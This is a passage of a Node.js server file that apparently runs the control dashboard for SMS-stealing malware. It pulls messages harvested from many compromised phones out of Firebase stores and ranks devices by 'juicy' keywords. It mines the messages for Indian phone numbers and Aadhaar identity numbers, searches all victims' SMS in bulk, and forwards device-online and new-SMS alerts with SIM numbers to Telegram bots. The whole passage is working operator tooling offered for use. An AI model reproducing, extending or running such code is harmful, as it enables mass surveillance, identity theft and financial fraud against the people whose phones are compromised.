  try { fs.writeFileSync(SIM_FILE, JSON.stringify(data, null, 2)); }
  catch (e) { console.error('SIM overrides save error:', e.message); }
}

function loadNotes() {
  try { if (fs.existsSync(NOTES_FILE)) return JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveNotesFile(notes) {
  try { fs.writeFileSync(NOTES_FILE, JSON.stringify(notes, null, 2)); }
  catch (e) { console.error('Notes save error:', e.message); }
}

// ── Summarise a target from dashboard DB ─────────────────────────────────────
function summariseTarget(target) {
  const db = getTargetDb(target);
  const deviceList = Object.entries(db);
  const total = deviceList.length;
  let online = 0, juicyCount = 0, withSim1 = 0, withSim2 = 0;
  let oldestActivity = null, newestActivity = null;

  for (const [, dev] of deviceList) {
    if (dev.current_status === 'online') online++;
    // Juicy count uses current active keyword list (JUICY_KEYWORDS, which is user-editable)
    // Backend stores all keywords ever found; frontend/count reflects current list
    if ((dev.juicy_keywords || []).some(k => JUICY_KEYWORDS.includes(k))) juicyCount++;
    if (extract10Digits(dev.sim1_number)) withSim1++;
    if (extract10Digits(dev.sim2_number)) withSim2++;
    const act = parseLastActivity(dev.last_activity);
    if (act) {
      if (!oldestActivity || act < oldestActivity) oldestActivity = act;
      if (!newestActivity || act > newestActivity) newestActivity = act;
    }
  }

  return {
    id: target.id, url: target.url, schema: target.schema, total, online,
    offline: total - online, juicyCount, withSim1, withSim2,
    oldestSms: oldestActivity ? oldestActivity.toISOString().slice(0,10) : null,
    newestSms: newestActivity ? newestActivity.toISOString().slice(0,10) : null,
  };
}

function buildDeviceList(target, devices, simOverrides, aadharDb) {
  const simKey = target.isSRK ? `srk_${target.id}` : (target.isPP ? `pp_${target.id}` : (target.isOld ? `old_${target.id}` : `new_${target.id}`));
  const simForUrl   = simOverrides[simKey] || simOverrides[String(target.id)] || {};
  const aadharForUrl = aadharDb[String(target.id)] || {};

  return Object.entries(devices)
    .map(([deviceId, dev]) => ({
      deviceId,
      brand:         dev.brand          || 'Unknown',
      status:        dev.current_status || 'offline',
      battery:       dev.last_battery   || 'N/A',
      lastActivity:  dev.last_activity  || null,
      smsDate:       dev.last_activity  || null,
      lastOnline:    dev.last_online    || null,
      sim1:          dev.sim1_number    || 'N/A',
      sim2:          dev.sim2_number    || 'N/A',
      sim1Clean:     extract10Digits(simForUrl[deviceId]?.sim1 || dev.sim1_number),
      sim2Clean:     extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
      sim1Override:  simForUrl[deviceId]?.sim1 || '',
      sim2Override:  simForUrl[deviceId]?.sim2 || '',
      // Frontend shows only current active keywords; full history is stored in backend
      juicyKeywords: (dev.juicy_keywords || []).filter(k => JUICY_KEYWORDS.includes(k)),
      appId:         dev.app_id         || 'N/A',
      objId:         dev.obj_id         || 'N/A',
      userSerial:    dev.user_serial    || 'N/A',
      sim1Enriched:  dev.sim1_enriched  || [],
      sim2Enriched:  dev.sim2_enriched  || [],
      smsLink:       getSmsLink(target, deviceId, dev.obj_id),
      hasAadhaar:    !!(aadharForUrl[deviceId]?.length),
      aadhaarNums:   aadharForUrl[deviceId] || [],
    }))
    .sort((a, b) => {
      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
      if (b.juicyKeywords.length !== a.juicyKeywords.length)
        return b.juicyKeywords.length - a.juicyKeywords.length;
      return 0;
    });
}

// ── API routes ────────────────────────────────────────────────────────────────
app.get('/api/urls', (req, res) => {
  const summaries = TARGETS.map(t => summariseTarget(t)).filter(t => t.total > 0);
  res.json(summaries);
});

app.get('/api/old/urls', (req, res) => {
  const summaries = OLD_TARGETS.map(t => summariseTarget(t)).filter(t => t.total > 0);
  res.json(summaries);
});

app.get('/api/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  const devices     = getTargetDb(target);
  const simOverrides = loadSimOverrides();
  const aadharDb    = loadAadharDb();
  const deviceList  = buildDeviceList(target, devices, simOverrides, aadharDb);
  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

app.get('/api/old/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = OLD_TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  const devices     = getTargetDb(target);
  const simOverrides = loadSimOverrides();
  const aadharDb    = loadAadharDb();
  const deviceList  = buildDeviceList(target, devices, simOverrides, aadharDb);
  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

// ── PP URLs API routes ────────────────────────────────────────────────────────
app.get('/api/pp/urls', (req, res) => {
  // Return all PP targets, including empty ones so they're visible
  const summaries = PP_TARGETS.map(t => summariseTarget(t));
  res.json(summaries);
});

app.get('/api/pp/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = PP_TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  const devices      = getTargetDb(target);
  const simOverrides = loadSimOverrides();
  const aadharDb     = loadAadharDb();
  const deviceList   = buildDeviceList(target, devices, simOverrides, aadharDb);
  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

// ── SRK URLs API routes ───────────────────────────────────────────────────────
app.get('/api/srk/urls', (req, res) => {
  const summaries = SRK_TARGETS.map(t => summariseTarget(t));
  res.json(summaries);
});

app.get('/api/srk/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = SRK_TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  const devices      = getTargetDb(target);
  const simOverrides = loadSimOverrides();
  const aadharDb     = loadAadharDb();
  const deviceList   = buildDeviceList(target, devices, simOverrides, aadharDb);
  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

app.post('/api/srk/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
  const { urlId, deviceId } = req.params;
  const { sim1, sim2 } = req.body;
  const overrides = loadSimOverrides();
  const key = `srk_${urlId}`;
  if (!overrides[key]) overrides[key] = {};
  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
    delete overrides[key][deviceId];
  saveSimOverrides(overrides);
  res.json({ ok: true });
});

app.post('/api/pp/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
  const { urlId, deviceId } = req.params;
  const { sim1, sim2 } = req.body;
  const overrides = loadSimOverrides();
  const key = `pp_${urlId}`;
  if (!overrides[key]) overrides[key] = {};
  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
    delete overrides[key][deviceId];
  saveSimOverrides(overrides);
  res.json({ ok: true });
});

// ── Force-refresh a single target immediately ─────────────────────────────────
app.post('/api/url/:id/refresh', async (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id) || OLD_TARGETS.find(t => t.id === id) || PP_TARGETS.find(t => t.id === id) || SRK_TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  await pollTarget(target);
  res.json({ ok: true, devices: Object.keys(getTargetDb(target)).length });
});

// ── Live fetch (bypasses DB — used by refreshAll in frontend) ─────────────────
app.get('/api/url/:id/live', async (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id)
    || OLD_TARGETS.find(t => t.id === id)
    || PP_TARGETS.find(t => t.id === id)
    || SRK_TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  await pollTarget(target);
  const db = getTargetDb(target);
  const devices = Object.entries(db).map(([deviceId, d]) => ({
    deviceId,
    brand:   d.brand || 'Unknown',
    status:  d.current_status || 'offline',
    battery: d.last_battery   || 'N/A',
  })).sort((a, b) => (a.status === 'online' ? -1 : 1) - (b.status === 'online' ? -1 : 1));
  res.json({ id, total: devices.length, online: devices.filter(d => d.status === 'online').length, devices });
});

// ── Schema 17: serve filtered SMS for a specific device (no Firebase index needed)
app.get('/api/url/:id/device/:deviceId/sms', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const target = [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
  if (!target || target.schema !== 17) return res.status(404).json({ error: 'Not schema 17' });

  try {
    const allMsgs = await fbFetch(`${target.url}/messages.json`);
    if (!allMsgs) return res.json({});
    // Filter by deviceID field matching deviceId (outer client key)
    const db = getTargetDb(target);
    const dev = db[deviceId];
    const filterDid = dev?.obj_id !== 'N/A' ? dev?.obj_id : deviceId;
    const filtered = {};
    for (const [k, v] of Object.entries(allMsgs)) {
      if (v && (v.deviceID === filterDid || v.deviceId === filterDid)) {
        filtered[k] = v;
      }
    }
    res.setHeader('Content-Type', 'application/json');
    res.send(JSON.stringify(filtered, null, 2));
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ── SearchNo: find Indian phone numbers in device SMS ─────────────────────────
app.get('/api/url/:id/device/:deviceId/searchno', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const mode = req.query.mode || 'new';
  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });
  const db = getTargetDb(target);
  const dev = db[deviceId];
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
  try {
    const smsData = await fbFetch(fetchUrl);
    const PHONE_RE = /(?<!\d)(?:\+91|91)?([6-9]\d{9})(?!\d)/g;
    const MISSED_CALL_RE = /missed\s+call(s)?\s+(from|to)/i;
    const AVAILABLE_RE = /is\s+now\s+available|available\s+to\s+(take|receive|answer)/i;
    const hits = [];
    for (const msg of iterMsgs(smsData)) {
      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
      if (!body || MISSED_CALL_RE.test(body) || AVAILABLE_RE.test(body)) continue;
      const phones = [...new Set([...body.matchAll(PHONE_RE)].map(m => m[1]))];
      if (phones.length) hits.push({ body, phones });
      if (hits.length >= 100) break;
    }
    res.json({ hits, total: hits.length });
  } catch (e) {
    res.json({ hits: [], total: 0, error: e.message });
  }
});

// ── SearchAadhar: find Aadhaar numbers in device SMS ─────────────────────────
app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const mode = req.query.mode || 'new';
  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });
  const db = getTargetDb(target);
  const dev = db[deviceId];
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
  try {
    const smsData = await fbFetch(fetchUrl);
    const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
    const AADHAR_KW = /aadhaar|aadhar/i;
    const hits = [];
    for (const msg of iterMsgs(smsData)) {
      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
      if (!body) continue;
      const aadhars = [...new Set([...body.matchAll(AADHAR_RE)].map(m => m[1]))];
      if (aadhars.length && AADHAR_KW.test(body)) hits.push({ body, aadhars, hasKeyword: true });
      if (hits.length >= 100) break;
    }
    res.json({ hits, total: hits.length });
  } catch (e) {
    res.json({ hits: [], total: 0, error: e.message });
  }
});

// ── SMS Search: search all devices in a URL for keyword ──────────────────────
app.get('/api/url/:id/sms-search', async (req, res) => {
  const id = parseInt(req.params.id);
  const q  = (req.query.q || '').trim().toLowerCase();
  if (!q) return res.json({ hits: [], total: 0, error: 'No query' });
  const mode = req.query.mode || 'new';
  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : mode === 'srk' ? SRK_TARGETS : TARGETS;
  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS, ...SRK_TARGETS].find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });

  const db = getTargetDb(target);
  const deviceEntries = Object.entries(db);
  if (!deviceEntries.length) return res.json({ hits: [], total: 0, error: 'No cached devices' });

  const hits = [], errors = [];
  let stopped = false;
  for (const [deviceId, dev] of deviceEntries) {
    if (stopped) break;
    const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace(/\?.*$/, '');
    try {
      const smsData = await fbFetch(fetchUrl);
      for (const msg of iterMsgs(smsData)) {
        const body = String(msg.body || msg.message || msg.msg || msg.text || '');
        if (!body) continue;
        if (body.toLowerCase().includes(q)) {
          hits.push({ deviceId, brand: dev.brand || 'Unknown', body });
          if (hits.length >= 200) { stopped = true; break; }
        }
      }
    } catch (e) {
      errors.push(`${deviceId}: ${e.message}`);
    }
  }
  res.json({ hits, total: hits.length, errors: errors.slice(0, 10) });
});

// ── Global device search across ALL URLs (new + old + pp) ────────────────────
app.get('/api/search/device/:deviceId', (req, res) => {
  const q = req.params.deviceId.toLowerCase().trim();
  const results = [];
  for (const target of ALL_TARGETS) {
    const db = getTargetDb(target);
    for (const [deviceId, dev] of Object.entries(db)) {
      if (deviceId.toLowerCase().includes(q)) {
        const urlSet = target.isSRK ? 'srk' : (target.isPP ? 'pp' : (target.isOld ? 'old' : 'new'));
        results.push({
          urlId: target.id, url: target.url, schema: target.schema,
          urlSet, deviceId,
          brand:         dev.brand          || 'Unknown',
          status:        dev.current_status || 'offline',
          battery:       dev.last_battery   || 'N/A',
          sim1:          dev.sim1_number    || 'N/A',
          sim2:          dev.sim2_number    || 'N/A',
          lastActivity:  dev.last_activity  || null,
          juicyKeywords: (dev.juicy_keywords || []).filter(k => JUICY_KEYWORDS.includes(k)),
          smsLink:       getSmsLink(target, deviceId, dev.obj_id),
        });
      }
    }
  }
  res.json({ results, total: results.length });
});

// ── List all devices that have an alert configured (across all url sets) ──────
app.get('/api/alert-devices', (req, res) => {
  const results = [];
  for (const [urlSet, devices] of Object.entries(alertStore.alerts)) {
    for (const [deviceId, cfg] of Object.entries(devices)) {
      // Find the target for context
      const target = ALL_TARGETS.find(t => {
        const ts = t.isSRK ? 'srk' : (t.isPP ? 'pp' : (t.isOld ? 'old' : 'new'));
        return ts === urlSet;
      });
      // Get device record from DB
      let devRecord = null;
      for (const t of ALL_TARGETS) {
        const ts = t.isSRK ? 'srk' : (t.isPP ? 'pp' : (t.isOld ? 'old' : 'new'));
        if (ts !== urlSet) continue;
        const db = getTargetDb(t);
        if (db[deviceId]) { devRecord = db[deviceId]; break; }
      }
      const bot = alertStore.bots[cfg.bot_id];
      results.push({
        urlSet, deviceId,
        botName:     bot?.name || 'Unknown bot',
        triggers:    cfg.triggers || [],
        brand:       devRecord?.brand          || 'Unknown',
        status:      devRecord?.current_status || 'unknown',
        lastActivity:devRecord?.last_activity  || null,
        sim1:        devRecord?.sim1_number    || 'N/A',
      });
    }
  }
  res.json({ results, total: results.length });
});

// ── FindAll: live search SMS bodies across all cached devices ─────────────────
// This fetches SMS from Firebase for every device, searches body text.
// To avoid timeouts, searches cached DB first — returns devices where
// last_activity exists, then does live SMS fetch for matching candidates.
app.get('/api/findall', async (req, res) => {
  const q     = (req.query.q || '').trim().toLowerCase();
  const page  = Math.max(1, parseInt(req.query.page) || 1);
  const limit = Math.min(100, parseInt(req.query.limit) || 50);
  if (!q) return res.status(400).json({ error: 'q is required' });

  // Step 1: collect all devices from cache that have any SMS activity
  // (We only fetch Firebase for devices that have lastActivity — saves time)
  const candidates = [];
  for (const target of ALL_TARGETS) {
    const urlSet = target.isPP ? 'pp' : (target.isOld ? 'old' : 'new');
    const db = getTargetDb(target);
    for (const [deviceId, dev] of Object.entries(db)) {
      if (!dev.last_activity) continue; // skip devices with no SMS history
      candidates.push({ target, urlSet, deviceId, dev });
    }
  }

  // Step 2: fetch SMS for all candidates in parallel (batches of 20)
  const BATCH = 20;
  const hits = [];
  for (let i = 0; i < candidates.length; i += BATCH) {
    const batch = candidates.slice(i, i + BATCH);
    const fetched = await Promise.allSettled(batch.map(async ({ target, urlSet, deviceId, dev }) => {
      const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
      // Skip server-proxied URLs for schema 17 — build direct URL instead
      const actualUrl = fetchUrl.startsWith('/api/')
        ? null
        : fetchUrl;
      if (!actualUrl) return null;
      try {
        const smsData = await fbFetch(actualUrl);
        // Split search query into words for multi-word matching
        const searchWords = q.split(/\s+/).filter(w => w.length > 0);
        
        for (const msg of iterMsgs(smsData)) {
          const body = String(msg.body || msg.message || msg.msg || msg.text || '');
          if (!body) continue;
          
          const bodyLower = body.toLowerCase();
          // Check if ALL search words are present in the body (regardless of position/order)
          const allWordsMatch = searchWords.every(word => bodyLower.includes(word));
          
          if (allWordsMatch) {
            return {
              urlId:        target.id,
              urlSet,
              url:          target.url,
              deviceId,
              brand:        dev.brand          || 'Unknown',
              status:       dev.current_status || 'offline',
              battery:      dev.last_battery   || 'N/A',
              sim1:         dev.sim1_number    || 'N/A',
              lastActivity: dev.last_activity  || null,
              juicyKeywords: (dev.juicy_keywords || []).filter(k => JUICY_KEYWORDS.includes(k)),
              smsLink:      getSmsLink(target, deviceId, dev.obj_id),
              matchBody:    body.slice(0, 200), // snippet
            };
          }
        }
      } catch {}
      return null;
    }));
    for (const r of fetched) {
      if (r.status === 'fulfilled' && r.value) hits.push(r.value);
    }
    // Stop early if we have enough for many pages
    if (hits.length >= 2000) break;
  }

  // Sort: online first, then by lastActivity desc
  hits.sort((a, b) => {
    if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
    if (!a.lastActivity && !b.lastActivity) return 0;
    if (!a.lastActivity) return 1;
    if (!b.lastActivity) return -1;
    return a.lastActivity > b.lastActivity ? -1 : 1;
  });

  const totalResults = hits.length;
  const totalPages   = Math.ceil(totalResults / limit) || 1;
  const paged        = hits.slice((page - 1) * limit, page * limit);

  res.json({ results: paged, total: totalResults, page, totalPages, limit, candidates: candidates.length });
});
app.get('/api/debug/aadhar/:id', (req, res) => {
  const id  = req.params.id;
  const adb = loadAadharDb();
  res.json({
    file: AADHAR_FILE, exists: fs.existsSync(AADHAR_FILE),
    urlKeys: Object.keys(adb).slice(0, 10),
    devicesForUrl: adb[id] || {},
    count: Object.keys(adb[id] || {}).length,
  });
});

// ── SIM Overrides ─────────────────────────────────────────────────────────────
app.get('/api/sim-overrides/:urlId', (req, res) => {
  const overrides = loadSimOverrides();
  res.json(overrides[req.params.urlId] || {});
});

app.post('/api/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
  const { urlId, deviceId } = req.params;
  const { sim1, sim2 } = req.body;
  const mode = req.query.mode || 'new';
  const overrides = loadSimOverrides();
  const key = mode === 'new' ? `new_${urlId}` : `${mode}_${urlId}`;
  if (!overrides[key]) overrides[key] = {};
  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
    delete overrides[key][deviceId];
  saveSimOverrides(overrides);
  res.json({ ok: true });
});

app.post('/api/old/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
  const { urlId, deviceId } = req.params;
  const { sim1, sim2 } = req.body;
  const overrides = loadSimOverrides();
  const key = `old_${urlId}`;
  if (!overrides[key]) overrides[key] = {};
  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
    delete overrides[key][deviceId];
  saveSimOverrides(overrides);
  res.json({ ok: true });
});

// ── Device Notes ──────────────────────────────────────────────────────────────
function notesKey(urlId, deviceId, mode) {
  const prefix = mode === 'old' ? 'old' : mode === 'pp' ? 'pp' : mode === 'srk' ? 'srk' : 'new';
  return `${prefix}_${urlId}:${deviceId}`;
}

app.get('/api/notes/:urlId/:deviceId', (req, res) => {
  const mode = req.query.mode || 'new';
  const key = notesKey(req.params.urlId, req.params.deviceId, mode);
  const notes = loadNotes();
  // Fallback: also check legacy key without prefix
  res.json({ note: notes[key] || notes[`${req.params.urlId}:${req.params.deviceId}`] || '' });
});

app.post('/api/notes/:urlId/:deviceId', express.json(), (req, res) => {
  const mode = req.query.mode || 'new';
  const key = notesKey(req.params.urlId, req.params.deviceId, mode);
  const notes = loadNotes();
  notes[key] = req.body.note || '';
  saveNotesFile(notes);
  res.json({ ok: true });
});

// ── Device Names: save/load human-readable names per device ──────────────────
const NAMES_FILE = path.join(DATA_DIR, 'device_names.json');

function loadNames() {
  try { if (fs.existsSync(NAMES_FILE)) return JSON.parse(fs.readFileSync(NAMES_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveNamesFile(names) {
  try { fs.writeFileSync(NAMES_FILE, JSON.stringify(names, null, 2)); }
  catch (e) { console.error('Names save error:', e.message); }
}

app.get('/api/names/:urlId/:deviceId', (req, res) => {
  const mode = req.query.mode || 'new';
  const key = `${mode === 'new' ? 'new' : mode}_${req.params.urlId}:${req.params.deviceId}`;
  const names = loadNames();
  res.json({ name: names[key] || names[`${req.params.urlId}:${req.params.deviceId}`] || '' });
});

app.post('/api/names/:urlId/:deviceId', express.json(), (req, res) => {
  const mode = req.query.mode || 'new';
  const key = `${mode === 'new' ? 'new' : mode}_${req.params.urlId}:${req.params.deviceId}`;
  const names = loadNames();
  names[key] = (req.body.name || '').trim();
  if (!names[key]) delete names[key];
  saveNamesFile(names);
  res.json({ ok: true });
});

// Bulk load all names for a URL (for efficient table rendering)
app.get('/api/names/:urlId', (req, res) => {
  const mode = req.query.mode || 'new';
  const prefix = `${mode === 'new' ? 'new' : mode}_${req.params.urlId}:`;
  const all = loadNames();
  const forUrl = {};
  for (const [k, v] of Object.entries(all)) {
    if (k.startsWith(prefix)) forUrl[k.slice(prefix.length)] = v;
  }
  res.json(forUrl);
});

// ── Keywords: get/update the juicy keywords list ──────────────────────────────
const KEYWORDS_FILE = path.join(DATA_DIR, 'keywords.json');

function loadKeywords() {
  try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); }
  catch {}
  // Return the built-in list as default
  return [...JUICY_KEYWORDS];
}
function saveKeywordsFile(kws) {
  try { fs.writeFileSync(KEYWORDS_FILE, JSON.stringify(kws, null, 2)); }
  catch (e) { console.error('Keywords save error:', e.message); }
}

app.get('/api/keywords', (req, res) => {
  res.json({ keywords: loadKeywords() });
});

app.post('/api/keywords', express.json(), (req, res) => {
  const kws = req.body.keywords;
  if (!Array.isArray(kws)) return res.status(400).json({ error: 'keywords must be array' });
  const clean = [...new Set(kws.map(k => String(k).trim().toLowerCase()).filter(Boolean))];
  saveKeywordsFile(clean);
  // Hot-reload: update in-memory JUICY_KEYWORDS array
  JUICY_KEYWORDS.length = 0;
  for (const k of clean) JUICY_KEYWORDS.push(k);
  res.json({ ok: true, count: clean.length });
});

// ── Telegram Alert Store ──────────────────────────────────────────────────────
const ALERTS_FILE = path.join(DATA_DIR, 'telegram_alerts.json');

const VALID_URL_SETS = new Set(['new', 'old', 'pp', 'srk']);
const VALID_TRIGGERS  = new Set(['device_online', 'device_offline', 'new_sms']);
const MAX_BOT_NAME   = 100;
const MAX_BOT_TOKEN  = 200;

let alertStore = { bots: {}, alerts: { new: {}, old: {}, pp: {} } };

function loadAlertStore() {
  try {
    if (fs.existsSync(ALERTS_FILE)) {
      const raw    = fs.readFileSync(ALERTS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed.bots === 'object' && typeof parsed.alerts === 'object') {
        parsed.alerts.new = parsed.alerts.new || {};
        parsed.alerts.old = parsed.alerts.old || {};
        parsed.alerts.pp  = parsed.alerts.pp  || {};
        alertStore = parsed;
      } else {
        console.error(`[AlertStore] ${ALERTS_FILE}: invalid top-level structure, starting empty`);
      }
    }
  } catch (err) {
    console.error(`[AlertStore] Failed to load ${ALERTS_FILE}: ${err.message}, starting empty`);
  }
}

function saveAlertStore() {
  try {
    fs.writeFileSync(ALERTS_FILE, JSON.stringify(alertStore, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error(`[AlertStore] Failed to save ${ALERTS_FILE}: ${err.message}`);
    return false;
  }
}

function targetUrlSet(target) {
  if (target.isSRK) return 'srk';
  if (target.isPP)  return 'pp';
  if (target.isOld) return 'old';
  return 'new';
}

// ── Alert Notification Log ────────────────────────────────────────────────────
const ALERT_LOG_FILE = path.join(DATA_DIR, 'alert_log.json');
const MAX_LOG_ENTRIES = 200;
let alertLog = []; // [{ id, ts, botName, deviceId, urlSet, targetId, type, text, chatCount }]

function loadAlertLog() {
  try {
    if (fs.existsSync(ALERT_LOG_FILE)) alertLog = JSON.parse(fs.readFileSync(ALERT_LOG_FILE, 'utf8'));
    if (!Array.isArray(alertLog)) alertLog = [];
  } catch { alertLog = []; }
}
function saveAlertLog() {
  try { fs.writeFileSync(ALERT_LOG_FILE, JSON.stringify(alertLog, null, 2)); } catch {}
}
function appendAlertLog(entry) {
  alertLog.unshift({ id: crypto.randomUUID(), ts: new Date().toISOString(), ...entry });
  if (alertLog.length > MAX_LOG_ENTRIES) alertLog.length = MAX_LOG_ENTRIES;
  saveAlertLog();
}

loadAlertLog();

async function sendTelegramAlert(token, chatId, text) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10000),
    });
    if (!res.ok) {
      const body = await res.text().catch(() => '');
      console.warn(`[TelegramAlert] API returned ${res.status} for chat ${chatId}: ${body}`);
    }
  } catch (err) {
    console.warn(`[TelegramAlert] Failed to send to chat ${chatId}: ${err.message}`);
  }
}

// ── Telegram: sync subscribers for a bot (stores in alertStore) ──────────────
async function syncBotSubscribers(botId) {
  const bot = alertStore.bots[botId];
  if (!bot) return;
  try {
    const url  = `https://api.telegram.org/bot${bot.token}/getUpdates?limit=100&offset=-100`;
    const r    = await fetch(url, { signal: AbortSignal.timeout(10000) });
    if (!r.ok) return;
    const data = await r.json();
    if (!data.ok) return;
    const chatIds = new Set(bot.subscribers || []);
    for (const upd of (data.result || [])) {
      const chat =
        upd.message?.chat ||
        upd.channel_post?.chat ||
        upd.callback_query?.message?.chat ||
        upd.my_chat_member?.chat;
      if (chat?.id) chatIds.add(String(chat.id));
    }
    bot.subscribers = [...chatIds];
    saveAlertStore();
    console.log(`[TelegramSync] Bot "${bot.name}" — ${bot.subscribers.length} subscriber(s)`);
  } catch (e) {
    console.warn(`[TelegramSync] Failed to sync bot "${bot?.name}": ${e.message}`);
  }
}

// Sync all bots' subscribers — called at startup and each poll cycle
async function syncAllBotSubscribers() {
  for (const botId of Object.keys(alertStore.bots)) {
    await syncBotSubscribers(botId);
  }
}

function dispatchAlerts(target, deviceId, oldRecord, newRecord) {
  const urlSet = targetUrlSet(target);
  const config = alertStore.alerts[urlSet]?.[deviceId];
  if (!config) return;

  const bot = alertStore.bots[config.bot_id];
  if (!bot) {
    console.warn(`[AlertDispatch] Device ${deviceId} (${urlSet}): bot_id "${config.bot_id}" not found`);
    return;
  }

  // Send to all subscribers of this bot
  const subscribers = bot.subscribers || [];
  if (!subscribers.length) {
    console.warn(`[AlertDispatch] Device ${deviceId} (${urlSet}): bot "${bot.name}" has no subscribers yet`);
    return;
  }

  const now       = new Date().toISOString();
  const oldStatus = oldRecord?.current_status ?? null;
  const newStatus = newRecord?.current_status ?? null;

  // Status change alerts
  if (oldStatus !== newStatus) {
    if (newStatus === 'online' && config.triggers.includes('device_online')) {
      const text =
        `🔔 [${bot.name}]\n` +
        `Device: ${deviceId}\n` +
        `Brand: ${newRecord.brand ?? 'Unknown'}\n` +
        `URL Set: ${urlSet} (ID ${target.id})\n` +
        `Status: ${oldStatus ?? 'unknown'} → online\n` +
        `SIM1: ${newRecord.sim1_number ?? 'N/A'}\n` +
        `Time: ${now}`;
      for (const chatId of subscribers) sendTelegramAlert(bot.token, chatId, text);
      appendAlertLog({ botName: bot.name, deviceId, urlSet, targetId: target.id, type: 'device_online', text, chatCount: subscribers.length });
    }
    if (newStatus === 'offline' && config.triggers.includes('device_offline')) {
      const text =
        `🔔 [${bot.name}]\n` +
        `Device: ${deviceId}\n` +
        `Brand: ${newRecord.brand ?? 'Unknown'}\n` +
        `URL Set: ${urlSet} (ID ${target.id})\n` +
        `Status: ${oldStatus ?? 'unknown'} → offline\n` +
        `SIM1: ${newRecord.sim1_number ?? 'N/A'}\n` +
        `Time: ${now}`;
      for (const chatId of subscribers) sendTelegramAlert(bot.token, chatId, text);
      appendAlertLog({ botName: bot.name, deviceId, urlSet, targetId: target.id, type: 'device_offline', text, chatCount: subscribers.length });
    }
  }

  // New SMS alert — suppressed on first poll (oldRecord === null)
  if (
